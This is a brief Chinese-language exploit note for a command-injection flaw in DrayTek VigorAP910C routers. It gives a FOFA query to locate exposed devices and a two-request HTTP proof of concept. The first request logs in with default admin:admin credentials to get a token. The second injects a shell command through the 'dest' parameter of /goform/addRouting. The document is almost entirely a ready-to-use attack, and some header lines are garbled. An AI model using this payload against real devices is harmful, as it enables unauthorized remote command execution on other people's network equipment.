## draytek路由器addrouting命令执行漏洞

## fofa
```
header="realm="VigorAP910C"
```


## poc
```
获取token
GET /opmode.asp HTTP/1.1
Host:
Authorization: Basic YWRtaW46YWRtaW4=
Referer:{{Hostname}}  
ser-Agent: Mozilla/5.0 - |

执行命令
GET /goform/addRouting?AuthStr={{token}}&dest=||+echo+$(+{{rce}})%3b%23a HTTP/1.1
Host:
Authorization: Basic YWRtaW46YWRtaW4=  R
eferer:{{Hostname}}
User-Agent: Mozilla/5.0
```
